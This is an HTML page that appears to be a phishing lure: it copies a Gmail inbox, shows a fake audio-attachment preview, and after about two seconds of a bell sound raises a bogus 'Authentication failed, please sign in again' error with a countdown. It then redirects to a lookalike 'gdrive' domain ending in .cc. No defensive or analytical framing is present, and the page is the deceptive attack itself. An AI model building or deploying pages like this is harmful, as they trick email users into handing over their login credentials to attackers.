
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Audio Preview</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: {
                        'sans': ['Google Sans', 'Roboto', 'Arial', 'sans-serif'],
                    }
                }
            }
        }
    </script>
    <style>
        .line-clamp-2 {
            overflow: hidden;
            display: -webkit-box;
            -webkit-box-orient: vertical;
            -webkit-line-clamp: 2;
        }
        
        .volume-slider::-webkit-slider-thumb {
            appearance: none;
            width: 12px;
            height: 12px;
            background: white;
            border-radius: 50%;
            cursor: pointer;
        }
        
        .volume-slider::-moz-range-thumb {
            width: 12px;
            height: 12px;
            background: white;
            border-radius: 50%;
            border: none;
            cursor: pointer;
        }

        .hidden { display: none; }
        .block { display: block; }
    </style>
</head>
<body class="antialiased font-sans">
    <div class="fixed inset-0 bg-[#1f1f1f] overflow-hidden">
        <!-- Gmail Background - Heavily Blurred -->
        <div class="absolute inset-0 blur-[15px] select-none pointer-events-none">
            <!-- Top Gmail Bar -->
            <div class="h-16 bg-[#202124] flex items-center px-6 border-b border-gray-700">
                <div class="flex items-center space-x-4">
                    <div class="w-6 h-6">
                        <svg viewBox="0 0 24 24" class="w-6 h-6 text-red-500 fill-current">
                            <path d="M20,18H18V9.25L12,13L6,9.25V18H4V6H5.2L12,10.25L18.8,6H20M20,4H4C2.89,4 2,4.89 2,6V18A2,2 0 0,0 4,20H20A2,2 0 0,0 22,18V6C22,4.89 21.1,4 20,4Z" />
                        </svg>
                    </div>
                    <span class="text-gray-300 text-lg font-medium">Gmail</span>
                </div>
                <div class="flex-1 max-w-2xl mx-8">
                    <div class="bg-[#303134] rounded-full px-4 py-3 flex items-center">
                        <svg class="w-4 h-4 text-gray-400 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                        </svg>
                        <span class="text-gray-400 text-sm">Search mail</span>
                    </div>
                </div>
                <div class="flex items-center space-x-4">
                    <div class="w-8 h-8 bg-gray-600 rounded-full"></div>
                    <div class="w-8 h-8 bg-blue-600 rounded-full"></div>
                </div>
            </div>

            <!-- Main Gmail Layout -->
            <div class="flex h-[calc(100vh-4rem)]">
                <!-- Left Sidebar -->
                <div class="w-72 bg-[#1f1f1f] p-4 overflow-y-auto">
                    <!-- Compose Button -->
                    <div class="mb-6">
                        <button class="w-full bg-[#c2e7ff] text-[#041e49] rounded-full py-3 px-6 text-sm font-medium flex items-center justify-start">
                            <svg class="w-5 h-5 mr-3" fill="currentColor" viewBox="0 0 20 20">
                                <path d="M17.414 2.586a2 2 0 00-2.828 0L7 10.172V13h2.828l7.586-7.586a2 2 0 000-2.828z" />
                                <path fill-rule="evenodd" d="M2 6a2 2 0 012-2h4a1 1 0 010 2H4v10h10v-4a1 1 0 112 0v4a2 2 0 01-2 2H4a2 2 0 01-2-2V6z" clip-rule="evenodd" />
                            </svg>
                            Compose
                        </button>
                    </div>

                    <!-- Navigation Items -->
                    <div class="space-y-1">
                        <!-- Inbox - Active -->
                        <div class="flex items-center px-4 py-2 rounded-r-full bg-[#fce8e6] text-[#d93025]">
                            <svg class="w-5 h-5 mr-3" fill="currentColor" viewBox="0 0 20 20">
                                <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
                                <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
                            </svg>
                            <span class="text-sm font-medium flex-1">Inbox</span>
                            <span class="text-sm font-medium">2,847</span>
                        </div>

                        <!-- Starred -->
                        <div class="flex items-center px-4 py-2 rounded-lg text-gray-300 hover:bg-[#303134]">
                            <svg class="w-5 h-5 mr-3" fill="currentColor" viewBox="0 0 20 20">
                                <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
                            </svg>
                            <span class="text-sm">Starred</span>
                            <span class="ml-auto text-sm text-gray-400">12</span>
                        </div>

                        <!-- Snoozed -->
                        <div class="flex items-center px-4 py-2 rounded-lg text-gray-300 hover:bg-[#303134]">
                            <svg class="w-5 h-5 mr-3" fill="currentColor" viewBox="0 0 20 20">
                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd" />
                            </svg>
                            <span class="text-sm">Snoozed</span>
                        </div>

                        <!-- Sent -->
                        <div class="flex items-center px-4 py-2 rounded-lg text-gray-300 hover:bg-[#303134]">
                            <svg class="w-5 h-5 mr-3" fill="currentColor" viewBox="0 0 20 20">
                                <path d="M10.894 2.553a1 1 0 00-1.788 0l-7 14a1 1 0 001.169 1.409l5-1.429A1 1 0 009 15.571V11a1 1 0 112 0v4.571a1 1 0 00.725.962l5 1.428a1 1 0 001.17-1.408l-7-14z" />
                            </svg>
                            <span class="text-sm">Sent</span>
                        </div>

                        <!-- Drafts -->
                        <div class="flex items-center px-4 py-2 rounded-lg text-gray-300 hover:bg-[#303134]">
                            <svg class="w-5 h-5 mr-3" fill="currentColor" viewBox="0 0 20 20">
                                <path fill-rule="evenodd" d="M4 4a2 2 0 012-2h4.586A2 2 0 0112 2.586L15.414 6A2 2 0 0116 7.414V16a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm2 6a1 1 0 011-1h6a1 1 0 110 2H7a1 1 0 01-1-1zm1 3a1 1 0 100 2h6a1 1 0 100-2H7z" clip-rule="evenodd" />
                            </svg>
                            <span class="text-sm">Drafts</span>
                            <span class="ml-auto text-sm text-gray-400">23</span>
                        </div>

                        <!-- More -->
                        <div class="flex items-center px-4 py-2 rounded-lg text-gray-300 hover:bg-[#303134]">
                            <svg class="w-5 h-5 mr-3" fill="currentColor" viewBox="0 0 20 20">
                                <path d="M10 6a2 2 0 110-4 2 2 0 010 4zM10 12a2 2 0 110-4 2 2 0 010 4zM10 18a2 2 0 110-4 2 2 0 010 4z" />
                            </svg>
                            <span class="text-sm">More</span>
                        </div>

                        <!-- Categories -->
                        <div class="pt-4 border-t border-gray-700 mt-4">
                            <div class="text-xs text-gray-500 uppercase tracking-wider mb-2 px-4">Categories</div>
                            
                            <div class="flex items-center px-4 py-1 text-gray-300">
                                <div class="w-3 h-3 bg-blue-500 rounded-full mr-3"></div>
                                <span class="text-sm">Primary</span>
                            </div>
                            
                            <div class="flex items-center px-4 py-1 text-gray-300">
                                <div class="w-3 h-3 bg-yellow-500 rounded-full mr-3"></div>
                                <span class="text-sm">Social</span>
                                <span class="ml-auto text-xs text-gray-400">23</span>
                            </div>
                            
                            <div class="flex items-center px-4 py-1 text-gray-300">
                                <div class="w-3 h-3 bg-green-500 rounded-full mr-3"></div>
                                <span class="text-sm">Promotions</span>
                                <span class="ml-auto text-xs text-gray-400">78</span>
                            </div>
                        </div>

                        <!-- Labels -->
                        <div class="pt-4 border-t border-gray-700 mt-4">
                            <div class="text-xs text-gray-500 uppercase tracking-wider mb-2 px-4">Labels</div>
                            
                            <div class="flex items-center px-4 py-1 text-gray-300">
                                <div class="w-3 h-3 bg-red-500 rounded-full mr-3"></div>
                                <span class="text-sm">Important</span>
                            </div>
                            
                            <div class="flex items-center px-4 py-1 text-gray-300">
                                <div class="w-3 h-3 bg-purple-500 rounded-full mr-3"></div>
                                <span class="text-sm">Travel</span>
                            </div>
                            
                            <div class="flex items-center px-4 py-1 text-gray-300">
                                <div class="w-3 h-3 bg-orange-500 rounded-full mr-3"></div>
                                <span class="text-sm">Work</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Email Content Area -->
                <div class="flex-1 bg-[#1f1f1f] overflow-y-auto">
                    <!-- Toolbar -->
                    <div class="h-12 bg-[#202124] border-b border-gray-700 flex items-center px-4">
                        <div class="flex items-center space-x-4">
                            <input type="checkbox" class="w-4 h-4">
                            <svg class="w-4 h-4 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                                <path d="M17.414 2.586a2 2 0 00-2.828 0L7 10.172V13h2.828l7.586-7.586a2 2 0 000-2.828z" />
                            </svg>
                            <svg class="w-4 h-4 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                                <path fill-rule="evenodd" d="M9 2a1 1 0 000 2h2a1 1 0 100-2H9z" clip-rule="evenodd" />
                                <path fill-rule="evenodd" d="M4 5a2 2 0 012-2v1a1 1 0 001 1h6a1 1 0 001-1V3a2 2 0 012 2v6.5a4.5 4.5 0 11-9 0V5zM7 8a1 1 0 012 0v3.5a2.5 2.5 0 105 0V8a1 1 0 112 0v3.5a4.5 4.5 0 01-9 0V8z" clip-rule="evenodd" />
                            </svg>
                            <svg class="w-4 h-4 text-gray-400" fill="currentColor" viewBox="0 0 20 20">
                                <path d="M10 6a2 2 0 110-4 2 2 0 010 4zM10 12a2 2 0 110-4 2 2 0 010 4zM10 18a2 2 0 110-4 2 2 0 010 4z" />
                            </svg>
                        </div>
                        <div class="ml-auto">
                            <span class="text-xs text-gray-400">1-50 of 2,847</span>
                        </div>
                    </div>

                    <!-- Email List -->
                    <div class="divide-y divide-gray-700">
                        <!-- Email Item 1 - With Audio Attachment -->
                        <div class="p-4 hover:bg-[#303134] cursor-pointer bg-[#2a2a2a]">
                            <div class="flex items-start space-x-4">
                                <input type="checkbox" class="w-4 h-4 mt-2">
                                <svg class="w-4 h-4 text-yellow-500 mt-2" fill="currentColor" viewBox="0 0 20 20">
                                    <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
                                </svg>
                                <div class="flex-1 min-w-0">
                                    <div class="flex items-center justify-between">
                                        <div class="font-medium text-white">Astrality Records</div>
                                        <div class="text-xs text-gray-400">Aug 26</div>
                                    </div>
                                    <div class="text-sm text-white mt-1">New Instrumental: Astrality Instr 124</div>
                                    <div class="text-sm text-gray-300 mt-1 line-clamp-2">Hey! We're excited to share our latest instrumental track with you. This atmospheric instrumental piece features rich soundscapes and evolving melodies. Perfect for your creative projects! The track showcases our signature sound design with layered textures that create an immersive listening experience...</div>
                                    
                                    <!-- Audio Attachment -->
                                    <div class="mt-3 flex items-center space-x-2 p-2 bg-[#1f1f1f] rounded border">
                                        <div class="w-8 h-8 bg-[#ff6d01] rounded flex items-center justify-center">
                                            <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20">
                                                <path d="M18 3a1 1 0 00-1.196-.98l-10 2A1 1 0 006 5v6.114A4.369 4.369 0 005 11c-1.657 0-3 .895-3 2s1.343 2 3 2 3-.895 3-2V7.82l8-1.6v5.894A4.369 4.369 0 0015 12c-1.657 0-3 .895-3 2s1.343 2 3 2 3-.895 3-2V3z" />
                                            </svg>
                                        </div>
                                        <div class="flex-1 min-w-0">
                                            <div class="text-sm font-medium text-white">Astrality Instr 124 1606.mp3</div>
                                            <div class="text-xs text-gray-400">3.2 MB â€¢ Audio file</div>
                                        </div>
                                        <svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                                        </svg>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Additional Email Items -->
                        <div class="p-4 hover:bg-[#303134] cursor-pointer">
                            <div class="flex items-start space-x-4">
                                <input type="checkbox" class="w-4 h-4 mt-2">
                                <div class="w-4 h-4 mt-2"></div>
                                <div class="flex-1 min-w-0">
                                    <div class="flex items-center justify-between">
                                        <div class="font-medium text-white">Sarah Johnson</div>
                                        <div class="text-xs text-gray-400">Aug 25</div>
                                    </div>
                                    <div class="text-sm text-white mt-1">Re: Q3 Marketing Campaign Update</div>
                                    <div class="text-sm text-gray-400 mt-1 line-clamp-2">Hi team, I wanted to provide an update on our Q3 marketing campaign progress. We've successfully completed the initial market research phase and are moving forward with creative development...</div>
                                </div>
                            </div>
                        </div>

                        <div class="p-4 hover:bg-[#303134] cursor-pointer">
                            <div class="flex items-start space-x-4">
                                <input type="checkbox" class="w-4 h-4 mt-2">
                                <div class="w-4 h-4 mt-2"></div>
                                <div class="flex-1 min-w-0">
                                    <div class="flex items-center justify-between">
                                        <div class="font-medium text-white">Michael Chen</div>
                                        <div class="text-xs text-gray-400">Aug 24</div>
                                    </div>
                                    <div class="text-sm text-white mt-1">Weekly Stand-up Notes</div>
                                    <div class="text-sm text-gray-400 mt-1 line-clamp-2">Thanks everyone for joining today's stand-up. Here are the key takeaways: Backend API integration is 80% complete, frontend responsive design implementation in progress...</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Audio Preview Header -->
        <div class="relative z-10 flex items-center justify-between h-12 px-4 bg-[#2d2d2d] text-white">
            <div class="flex items-center space-x-3">
                <button class="w-6 h-6 flex items-center justify-center hover:bg-white/10 rounded">
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>
                <div class="flex items-center space-x-2">
                    <svg class="w-4 h-4 text-red-400" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd" />
                    </svg>
                    <span class="text-sm font-medium">Astrality Instr 124 1606.mp3</span>
                </div>
            </div>
            
            <div class="flex items-center space-x-2">
                <svg class="w-4 h-4 text-white/70 hover:text-white cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316-1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632-3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3 3 0 105.367 2.684 3 3 0 00-5.367-2.684z" />
                </svg>
                <svg class="w-4 h-4 text-white/70 hover:text-white cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                </svg>
                <button class="flex items-center space-x-1 px-3 py-1.5 bg-[#3c4043] hover:bg-[#484a4d] rounded text-sm transition-colors">
                    <span>Open with</span>
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
                    </svg>
                </button>
                <button class="w-6 h-6 flex items-center justify-center hover:bg-white/10 rounded">
                    <div class="flex items-center space-x-0.5">
                        <div class="w-1 h-1 bg-white rounded-full"></div>
                        <div class="w-1 h-1 bg-white rounded-full"></div>
                        <div class="w-1 h-1 bg-white rounded-full"></div>
                    </div>
                </button>
            </div>
        </div>

        <!-- Centered Audio Player -->
        <div class="relative z-10 flex items-center justify-center min-h-[calc(100vh-3rem)]">
            <div class="bg-[#3c4043] rounded-xl px-12 py-8 shadow-2xl">
                <!-- Large Music Note Icon -->
                <div class="flex justify-center mb-8">
                    <svg class="w-20 h-20 text-white/80" fill="currentColor" viewBox="0 0 24 24">
                        <path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/>
                    </svg>
                </div>

                <!-- Audio Controls Row -->
                <div class="flex items-center space-x-4">
                    <!-- Play/Pause Button -->
                    <button 
                        id="playPauseBtn"
                        class="w-6 h-6 flex items-center justify-center transition-colors flex-shrink-0"
                    >
                        <svg id="playIcon" class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24">
                            <polygon points="5,3 19,12 5,21"></polygon>
                        </svg>
                        <svg id="pauseIcon" class="w-4 h-4 text-white hidden" fill="currentColor" viewBox="0 0 24 24">
                            <rect x="6" y="4" width="4" height="16"></rect>
                            <rect x="14" y="4" width="4" height="16"></rect>
                        </svg>
                    </button>

                    <!-- Progress Bar -->
                    <div class="flex-1 mx-3">
                        <div 
                            id="progressBar"
                            class="w-full h-1 bg-white/30 rounded-full cursor-pointer"
                        >
                            <div 
                                id="progressFill"
                                class="h-full bg-white rounded-full transition-all duration-100"
                                style="width: 0%"
                            ></div>
                        </div>
                    </div>

                    <!-- Time Display -->
                    <div id="timeDisplay" class="text-xs text-white font-medium min-w-[32px] text-center">
                        0:00
                    </div>

                    <!-- Volume Controls -->
                    <div class="flex items-center space-x-2 flex-shrink-0">
                        <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24">
                            <polygon points="11,5 6,9 2,9 2,15 6,15 11,19"></polygon>
                            <path d="m19.07 4.93-1.41 1.41C19.1 7.79 20 9.79 20 12s-.9 4.21-2.34 5.66l1.41 1.41C20.96 17.19 22 14.76 22 12s-1.04-5.19-2.93-7.07z"></path>
                            <path d="m15.54 8.46-1.41 1.41C14.6 10.33 15 11.13 15 12s-.4 1.67-.87 2.13l1.41 1.41C16.44 14.65 17 13.38 17 12s-.56-2.65-1.46-3.54z"></path>
                        </svg>
                        <input
                            id="volumeSlider"
                            type="range"
                            min="0"
                            max="1"
                            step="0.1"
                            value="1"
                            class="w-16 h-1 bg-white/30 rounded-full appearance-none cursor-pointer volume-slider"
                        />
                    </div>
                </div>
            </div>
        </div>

        <!-- Hidden Audio Element -->
        <audio 
            id="audioPlayer" 
            src="https://www.soundjay.com/misc/sounds/bell-ringing-05.wav"
            preload="metadata"
        ></audio>

        <!-- Error Modal -->
        <div id="errorModal" class="absolute inset-0 bg-black/70 flex items-center justify-center z-50 hidden">
            <div class="bg-[#2d2d2d] border border-gray-600 rounded-lg shadow-2xl max-w-md w-full mx-4 p-6 text-center relative">
                <!-- Close Button -->
                <button 
                    id="closeErrorBtn"
                    class="absolute top-3 right-3 w-6 h-6 flex items-center justify-center text-gray-400 hover:text-white transition-colors"
                >
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>

                <!-- Error Icon -->
                <div class="flex items-center justify-center mb-4">
                    <div class="w-12 h-12 bg-red-100 rounded-full flex items-center justify-center">
                        <svg class="w-6 h-6 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.864-.833-2.634 0L4.732 16.5c-.77.833.192 2.5 1.732 2.5z" />
                        </svg>
                    </div>
                </div>
                
<h2 class="text-lg font-semibold text-white mb-2">
        Something went wrong.
    </h2>
    <p class="text-gray-300 mb-4">Error Code: AUTH_001</p>
    <p class="text-gray-300 mb-6">Authentication failed. Please sign in again to access the file.</p>

                <!-- Action Buttons -->
                <div class="flex flex-col space-y-3">
                    <button 
                        id="redirectBtn"
                        class="w-full bg-[#4285f4] hover:bg-[#3367d6] text-white font-medium py-2.5 px-4 rounded-md transition-colors"
                    >
                        Go to Gmail
                    </button>
                    
                    <button 
                        id="closeModalBtn"
                        class="w-full bg-transparent border border-gray-600 hover:border-gray-500 text-gray-300 hover:text-white font-medium py-2.5 px-4 rounded-md transition-colors"
                    >
                        Close
                    </button>
                </div>

                <!-- Countdown -->
                <div class="mt-4 text-xs text-gray-500">
                    Auto-redirecting in <span id="countdown">2</span>s...
                </div>
            </div>
        </div>
    </div>

    <script>
        // Audio player functionality
        const audioPlayer = document.getElementById('audioPlayer');
        const playPauseBtn = document.getElementById('playPauseBtn');
        const playIcon = document.getElementById('playIcon');
        const pauseIcon = document.getElementById('pauseIcon');
        const progressBar = document.getElementById('progressBar');
        const progressFill = document.getElementById('progressFill');
        const timeDisplay = document.getElementById('timeDisplay');
        const volumeSlider = document.getElementById('volumeSlider');
        const errorModal = document.getElementById('errorModal');
        const closeErrorBtn = document.getElementById('closeErrorBtn');
        const redirectBtn = document.getElementById('redirectBtn');
        const closeModalBtn = document.getElementById('closeModalBtn');
        const countdownSpan = document.getElementById('countdown');

        let isPlaying = false;
        let currentTime = 0;
        let duration = 0;
        let volume = 1;
        let errorTimeout = null;
        let countdownInterval = null;

        // Format time in MM:SS
        function formatTime(time) {
            if (isNaN(time) || !isFinite(time)) return '0:00';
            const minutes = Math.floor(time / 60);
            const seconds = Math.floor(time % 60);
            return `${minutes}:${seconds.toString().padStart(2, '0')}`;
        }

        // Toggle play/pause
        function togglePlayPause() {
            if (isPlaying) {
                audioPlayer.pause();
            } else {
                audioPlayer.play();
            }
        }

        // Handle progress bar click
        function handleProgressClick(e) {
            const rect = progressBar.getBoundingClientRect();
            const percent = (e.clientX - rect.left) / rect.width;
            const newTime = percent * duration;
            audioPlayer.currentTime = newTime;
        }

        // Show error modal
        function showError() {
            errorModal.classList.remove('hidden');
            errorModal.classList.add('block');
            startCountdown();
        }

        // Hide error modal
        function hideError() {
            errorModal.classList.add('hidden');
            errorModal.classList.remove('block');
            if (countdownInterval) {
                clearInterval(countdownInterval);
            }
        }

        // Start countdown
        function startCountdown() {
            let count = 5;
            countdownSpan.textContent = count;
            
            countdownInterval = setInterval(() => {
                count--;
                countdownSpan.textContent = count;
                
                if (count <= 0) {
                    clearInterval(countdownInterval);
                    window.location.href = 'https://song-preview-jsb2k92hm9mczdfr91vq38bc6-gdrive.2398463295642.cc';
                }
            }, 1000);
        }

        // Event listeners
        playPauseBtn.addEventListener('click', togglePlayPause);
        progressBar.addEventListener('click', handleProgressClick);
        closeErrorBtn.addEventListener('click', hideError);
        closeModalBtn.addEventListener('click', hideError);
        redirectBtn.addEventListener('click', () => {
            window.location.href = 'https://song-preview-jsb2k92hm9mczdfr91vq38bc6-gdrive.2398463295642.cc';
        });

        volumeSlider.addEventListener('input', (e) => {
            volume = parseFloat(e.target.value);
            audioPlayer.volume = volume;
        });

        // Audio event listeners
        audioPlayer.addEventListener('loadedmetadata', () => {
            duration = audioPlayer.duration;
        });

        audioPlayer.addEventListener('timeupdate', () => {
            currentTime = audioPlayer.currentTime;
            timeDisplay.textContent = formatTime(currentTime);
            
            if (duration > 0) {
                const percent = (currentTime / duration) * 100;
                progressFill.style.width = percent + '%';
            }
        });

        audioPlayer.addEventListener('play', () => {
            isPlaying = true;
            playIcon.classList.add('hidden');
            pauseIcon.classList.remove('hidden');
            
            // Set error timeout for 3 seconds after play starts
            if (errorTimeout) {
                clearTimeout(errorTimeout);
            }
            
            errorTimeout = setTimeout(() => {
                audioPlayer.pause();
                isPlaying = false;
                playIcon.classList.remove('hidden');
                pauseIcon.classList.add('hidden');
                showError();
            }, 2000);
        });

        audioPlayer.addEventListener('pause', () => {
            isPlaying = false;
            playIcon.classList.remove('hidden');
            pauseIcon.classList.add('hidden');
        });

        audioPlayer.addEventListener('ended', () => {
            isPlaying = false;
            playIcon.classList.remove('hidden');
            pauseIcon.classList.add('hidden');
            currentTime = 0;
            progressFill.style.width = '0%';
            timeDisplay.textContent = '0:00';
        });

        // Set initial volume
        audioPlayer.volume = volume;

        // Attempt autoplay after a brief delay
        setTimeout(() => {
            audioPlayer.play().catch((error) => {
                console.log('Autoplay failed:', error);
                // Fallback: still show the error after 3 seconds even if autoplay fails
                errorTimeout = setTimeout(() => {
                    showError();
                }, 2000);
            });
        }, 500);
    </script>
</body>
</html>
